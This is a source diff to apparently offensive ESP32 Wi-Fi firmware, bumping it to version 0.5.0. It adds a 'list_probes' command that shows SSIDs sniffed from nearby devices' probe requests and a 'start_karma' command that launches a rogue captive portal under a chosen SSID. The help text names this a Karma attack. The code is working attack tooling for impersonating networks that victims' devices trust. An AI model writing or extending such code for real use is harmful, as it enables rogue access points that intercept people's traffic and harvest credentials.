@@ -56,7 +56,7 @@
 #include "lwip/dhcp.h"
 
 //Version number
-#define JANOS_VERSION "0.4.2"
+#define JANOS_VERSION "0.5.0"
 
 
 #define NEOPIXEL_GPIO      27
@@ -300,9 +300,11 @@ static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_show_sniffer_results(int argc, char **argv);
 static int cmd_show_probes(int argc, char **argv);
+static int cmd_list_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
 static int cmd_start_blackout(int argc, char **argv);
 static int cmd_start_portal(int argc, char **argv);
+static int cmd_start_karma(int argc, char **argv);
 static int cmd_list_sd(int argc, char **argv);
 static int cmd_select_html(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
@@ -2192,6 +2194,25 @@ static int cmd_show_probes(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_list_probes(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    if (probe_request_count == 0) {
+        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
+        return 0;
+    }
+    
+    // Display each probe request with index: INDEX SSID
+    for (int i = 0; i < probe_request_count; i++) {
+        probe_request_t *probe = &probe_requests[i];
+        printf("%d %s\n", i + 1, probe->ssid);
+        
+        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
+    }
+    
+    return 0;
+}
+
 static int cmd_sniffer_debug(int argc, char **argv) {
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Current sniffer debug mode: %s", sniff_debug ? "ON" : "OFF");
@@ -2299,6 +2320,49 @@ static int cmd_reboot(int argc, char **argv)
     vTaskDelay(pdMS_TO_TICKS(100));
     esp_restart();
     return 0;
+}
+
+// Command: start_karma - Starts portal with SSID from probe list
+static int cmd_start_karma(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_karma <index>");
+        MY_LOG_INFO(TAG, "Example: start_karma 2");
+        MY_LOG_INFO(TAG, "Use 'list_probes' to see available SSIDs with their indexes");
+        return 1;
+    }
+    
+    // Check if we have any probes captured
+    if (probe_request_count == 0) {
+        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data first.");
+        return 1;
+    }
+    
+    // Parse the index argument
+    int index = atoi(argv[1]);
+    
+    // Validate index (1-based for user, 0-based internally)
+    if (index < 1 || index > probe_request_count) {
+        MY_LOG_INFO(TAG, "Invalid index %d. Valid range: 1-%d", index, probe_request_count);
+        MY_LOG_INFO(TAG, "Use 'list_probes' to see available indexes");
+        return 1;
+    }
+    
+    // Convert to 0-based index
+    int probe_index = index - 1;
+    
+    // Get the SSID from the probe request
+    char *selected_ssid = probe_requests[probe_index].ssid;
+    
+    MY_LOG_INFO(TAG, "Starting Karma attack with SSID: %s", selected_ssid);
+    
+    // Prepare arguments for cmd_start_portal
+    char *portal_argv[2];
+    portal_argv[0] = "start_portal";
+    portal_argv[1] = selected_ssid;
+    
+    // Call cmd_start_portal with the selected SSID
+    return cmd_start_portal(2, portal_argv);
 }
 
 // Command: list_sd - Lists HTML files on SD card
@@ -3645,6 +3709,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_cmd));
 
+    const esp_console_cmd_t list_probes_cmd = {
+        .command = "list_probes",
+        .help = "Lists probe requests with index and SSID",
+        .hint = NULL,
+        .func = &cmd_list_probes,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&list_probes_cmd));
+
     const esp_console_cmd_t sniffer_debug_cmd = {
         .command = "sniffer_debug",
         .help = "Enable/disable detailed sniffer debug logging: sniffer_debug <0|1>",
@@ -3725,6 +3798,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
+
+    const esp_console_cmd_t karma_cmd = {
+        .command = "start_karma",
+        .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
+        .hint = NULL,
+        .func = &cmd_start_karma,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_cmd));
 
     const esp_console_cmd_t stop_cmd = {
         .command = "stop",
